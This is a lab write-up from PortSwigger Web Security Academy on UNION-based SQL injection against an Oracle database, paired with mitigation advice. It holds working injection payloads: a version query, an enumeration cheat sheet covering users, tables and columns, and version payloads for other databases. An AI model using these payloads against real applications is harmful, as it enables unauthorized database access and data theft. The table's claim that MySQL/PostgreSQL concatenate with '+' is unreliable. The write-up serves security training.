# SQL Injection UNION Attack - Querying Database Type and Version (Oracle)

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Determine the database type and extract the database version information using a UNION-based SQL injection attack on an Oracle database.

---

## Vulnerability

The application is vulnerable to UNION-based SQL injection, but this time the backend uses **Oracle Database** instead of MySQL or PostgreSQL. Oracle has unique syntax requirements and system tables that differ from other databases.

**Backend Query Structure:**
```sql
SELECT product_name, product_price FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing SQL injection
- **Oracle-specific syntax** not accounted for in any validation
- **Access to system metadata tables** — the database user can query `v$version`
- **Information disclosure** — version details are exposed to attackers

**Oracle Uniqueness:**  
Unlike MySQL/PostgreSQL, Oracle requires a `FROM` clause in every SELECT statement. You cannot do `SELECT NULL` in Oracle — you must do `SELECT NULL FROM dual`.

---

## Understanding Oracle SQL Injection

### Key Oracle Differences:

| Concept | MySQL/PostgreSQL | Oracle |
|---------|------------------|--------|
| **SELECT without FROM** | ✅ `SELECT NULL` | ❌ Invalid |
| **Dummy table** | Not needed | `dual` (built-in 1-row table) |
| **String concatenation** | `'a' + 'b'` or `CONCAT()` | `'a' \|\| 'b'` |
| **Comment syntax** | `--` or `#` | `--` |
| **Version info** | `@@version` or `VERSION()` | `SELECT banner FROM v$version` |

### Oracle System Tables:

Oracle stores metadata in special system views:
- **`v$version`** — Database version information (column: `banner`)
- **`all_tables`** — List of all accessible tables
- **`all_tab_columns`** — Column information for all tables
- **`dual`** — Single-row dummy table (always contains 1 row)

---

## Steps

1. **Detected Oracle database**
   - Standard UNION payloads with `FROM dual` requirement
   - Error messages hinting at Oracle syntax

2. **Found column count**
   - Payload: `' UNION SELECT NULL,NULL FROM dual--`
   - Result: ✅ Success → 2 columns confirmed

3. **Tested for text columns**
   - Payload: `' UNION SELECT 'test',NULL FROM dual--`
   - Result: ✅ Column 1 accepts text

4. **Queried Oracle version table**
   - Target: `v$version` system view
   - Column: `banner` (contains version strings)
   - Payload: `' UNION SELECT banner,NULL FROM v$version--`

5. **Extracted version information**
   - Successfully retrieved Oracle database version details
   - Version info displayed on the page
   - Lab solved ✅

---

## Payload

```sql
' UNION SELECT banner,NULL FROM v$version--
```

**URL-Encoded Version:**
```
category=Pets%27+UNION+SELECT+banner,NULL+FROM+v$version--
```

**Complete URL:**
```
/filter?category=Pets' UNION SELECT banner,NULL FROM v$version--
```

**Resulting SQL Query:**
```sql
SELECT product_name, product_price FROM products WHERE category = 'Pets'
UNION
SELECT banner, NULL FROM v$version--'
```

**What happens:**
- `Pets'` closes the category string
- `UNION SELECT banner,NULL` extracts version data
- `FROM v$version` queries Oracle's system table
- `banner` column contains version strings like:
  - `Oracle Database 11g Express Edition Release 11.2.0.2.0`
  - `TNS for Linux: Version 11.2.0.2.0`
  - `NLSRTL Version 11.2.0.2.0`
- `--` comments out trailing SQL

---

## Why Database Fingerprinting Matters

### Version Information Reveals:

**1. Known Vulnerabilities**
- Specific Oracle versions have documented CVEs
- Example: Oracle DB 11g has known privilege escalation bugs

**2. Syntax Compatibility**
- Determines which SQL functions are available
- Guides further exploitation techniques


**3. Attack Surface**
- Older versions = more known vulnerabilities
- Identifies if patches have been applied

---

## Oracle-Specific Enumeration

### Version Information:
```sql
' UNION SELECT banner,NULL FROM v$version--
```

### Database Name:
```sql
' UNION SELECT global_name,NULL FROM global_name--
```

### Current User:
```sql
' UNION SELECT user,NULL FROM dual--
```

### List All Tables:
```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

### List Columns in a Table:
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

---

## What I Learned

1. **Database fingerprinting is crucial** — each DBMS has unique syntax
2. **Oracle requires `FROM dual`** — cannot SELECT without a table
3. **System tables are goldmines** — `v$version`, `all_tables`, etc.
4. **Version information guides attacks** — reveals vulnerabilities and capabilities
5. **String concatenation in Oracle** uses `||` not `+`

---

## Real-World Pentesting Value

**Example Attack Path:**
```
1. Identify Oracle DB (this lab)
   ↓
2. Find version is Oracle 11g (outdated)
   ↓
3. Research CVE-2012-1675 (privilege escalation)
   ↓
4. Exploit to gain DBA privileges
   ↓
5. Execute OS commands via Java stored procedures
```

---

## Mitigation

**For Developers:**
- Use **parameterized queries** — prevents SQL injection entirely
- **Restrict access to system views** — `v$version`, `all_tables` should be blocked
- Apply **least privilege** — application user shouldn't query metadata
- **Disable error messages** in production — prevents version leakage
- **Keep Oracle patched** — apply security updates regularly

**Example Fix (Python with cx_Oracle):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure  
query = "SELECT * FROM products WHERE category = :category"
cursor.execute(query, category=user_input)
```

**Database Hardening (Oracle):**
```sql
-- Revoke access to system views
REVOKE SELECT ON v$version FROM webapp_user;
REVOKE SELECT ON all_tables FROM webapp_user;

-- Grant only necessary privileges
GRANT SELECT ON products TO webapp_user;
```

---

## Database-Specific Cheat Sheet

### MySQL Version:
```sql
' UNION SELECT @@version,NULL--
```

### PostgreSQL Version:
```sql
' UNION SELECT version(),NULL--
```

### Microsoft SQL Server Version:
```sql
' UNION SELECT @@version,NULL--
```

### Oracle Version (this lab):
```sql
' UNION SELECT banner,NULL FROM v$version--
```
